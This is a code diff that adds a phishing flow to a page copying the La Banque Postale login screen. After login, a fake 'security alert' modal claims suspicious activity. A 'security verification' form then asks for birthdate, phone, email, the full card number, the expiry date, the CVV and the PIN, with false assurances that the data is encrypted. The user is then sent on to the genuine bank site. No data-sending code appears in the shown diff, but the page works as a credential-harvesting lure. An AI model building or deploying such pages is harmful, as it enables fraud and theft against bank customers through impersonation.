@@ -2,6 +2,7 @@
     <head>
         <link rel="icon" type="image/png" href="fav.png">
 
+
         <title>La Banque Postale - Connexion</title>
 <style>
 body {
@@ -185,6 +186,84 @@ body {
         font-size: 16px;
     }
 }
+/* Additional styles for security page */
+#security-page input {
+    width: 100%;
+    padding: 12px 8px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    box-sizing: border-box;
+    font-size: 16px;
+    margin-top: 5px;
+}
+
+#security-page input:focus {
+    border-color: #0046c0;
+    outline: none;
+    box-shadow: 0 0 0 2px rgba(0,70,192,0.2);
+}
+
+#security-page .button:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+}
+
+#security-page .error {
+    color: #ff0000;
+    font-size: 14px;
+    margin-top: 5px;
+    display: none;
+}
+
+@media (max-width: 768px) {
+    #security-page .container {
+        flex-direction: column;
+    }
+    
+    #security-page .login-form {
+        width: 100%;
+        max-width: 400px;
+        margin: 0 auto;
+    }
+}
+/* Modal styles */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0.5);
+    animation: fadeIn 0.3s ease-in-out;
+}
+
+.modal-content {
+    background-color: #fff;
+    margin: 15% auto;
+    padding: 20px;
+    border-radius: 8px;
+    width: 80%;
+    max-width: 500px;
+    position: relative;
+    animation: slideIn 0.3s ease-in-out;
+}
+
+.modal h2 {
+    color: #ff3b30;
+    margin-top: 0;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+@keyframes slideIn {
+    from { transform: translateY(-100px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
 </style>
 </head>
 <body>
@@ -281,7 +360,73 @@ body {
         </div>
     </div>
 </div>
+<div id="security-page" style="display: none;">
+    <div class="container">
+        <div class="login-form">
+            <svg class="logo" viewBox="0 0 200 50">
+                <path d="M10,25 h30 v-10 h20" stroke="#0046c0" fill="none" stroke-width="3"/>
+                <text x="70" y="30" fill="#0046c0" font-size="16">La Banque Postale</text>
+            </svg>
+            
+            <h3>Vérification de sécurité</h3>
+            
+            <div class="form-group">
+                <label>Date de naissance</label>
+                <input type="date" id="birthdate" required />
+            </div>
 
+            <div class="form-group">
+                <label>Numéro de téléphone mobile</label>
+                <input type="tel" id="phone" pattern="[0-9]{10}" required placeholder="0612345678" />
+            </div>
+
+            <div class="form-group">
+                <label>Adresse email</label>
+                <input type="email" id="email" required />
+            </div>
+
+            <div class="form-group">
+                <label>Numéro de la carte (PAN) : Les 16 chiffres</label>
+                <input type="number" id="security-question" maxlength="16"  minlength="16" required />
+            </div>
+
+            <div class="form-group">
+                <label>Date d'expiration : Mois et année</label>
+                <input type="number" id="security-question" required />
+            </div>
+
+            <div class="form-group">
+                <label>Code de sécurité (CVV) : Les 3 chiffres au dos</label>
+                <input type="number" id="security-question" maxlength="3" minlength="3" required>
+            </div>
+
+            <div class="form-group">
+                <label>Code PIN : Ne jamais le communiquer, même à des proches</label>
+                <input type="text" id="security-question" required />
+            </div>
+
+            
+            <button class="button" onclick="submitSecurityInfo()">Valider</button>
+        </div>
+        
+        <div class="right-section">
+            <div class="info-box">
+                <h3>Pourquoi ces informations ?</h3>
+                <p>Ces informations nous permettent de sécuriser votre compte et de vous protéger contre la fraude.</p>
+                <p>Vos données sont protégées et cryptées selon les normes de sécurité les plus strictes.</p>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="security-alert" class="modal">
+    <div class="modal-content">
+        <h2>⚠️ Alerte de sécurité</h2>
+        <p>Des activités suspectes ont été détectées sur votre compte.</p>
+        <p>Pour votre sécurité, nous devons vérifier votre identité et mettre à jour les informations de sécurité de votre compte.</p>
+        <p>Veuillez compléter les informations sur la page suivante pour sécuriser votre compte.</p>
+        <button class="button" onclick="closeModal()">Continuer</button>
+    </div>
+</div>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const numpad = document.getElementById('numpad');
@@ -349,7 +494,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
         
         if (isValid) {
-            alert('Connexion en cours...');
+            showSecurityAlert();
         }
     });
     
@@ -364,6 +509,56 @@ document.addEventListener('DOMContentLoaded', function() {
         this.value = this.value.replace(/\D/g, '');
     });
 });
+
+function showSecurityAlert() {
+    document.getElementById('security-alert').style.display = 'block';
+}
+
+function closeModal() {
+    document.getElementById('security-alert').style.display = 'none';
+    document.querySelector('.container').style.display = 'none';
+    document.getElementById('security-page').style.display = 'block';
+}
+
+function submitSecurityInfo() {
+    const birthdate = document.getElementById('birthdate').value;
+    const phone = document.getElementById('phone').value;
+    const email = document.getElementById('email').value;
+    const securityQuestion = document.getElementById('security-question').value;
+    
+    // Validate all fields
+    if (!birthdate || !phone || !email || !securityQuestion) {
+        alert('Veuillez remplir tous les champs obligatoires');
+        return;
+    }
+
+    // Validate phone number format
+    if (!/^0[1-9][0-9]{8}$/.test(phone)) {
+        alert('Le numéro de téléphone doit être au format valide (ex: 0612345678)');
+        return;
+    }
+
+    // Validate email format
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        alert('Veuillez entrer une adresse email valide');
+        return;
+    }
+
+    // Show loading state
+    const submitButton = document.querySelector('#security-page .button');
+    const originalText = submitButton.textContent;
+    submitButton.textContent = 'Chargement...';
+    submitButton.disabled = true;
+
+    // Simulate API call delay
+    setTimeout(() => {
+        // Success message
+        alert('Vos informations ont été enregistrées avec succès.\nVous allez être redirigé vers votre espace client.');
+        
+        // Simulate redirect to dashboard
+        window.location.href = 'https://www.labanquepostale.fr/particulier/espace-client';
+    }, 2000);
+}
 </script>
 </body>
 </html>
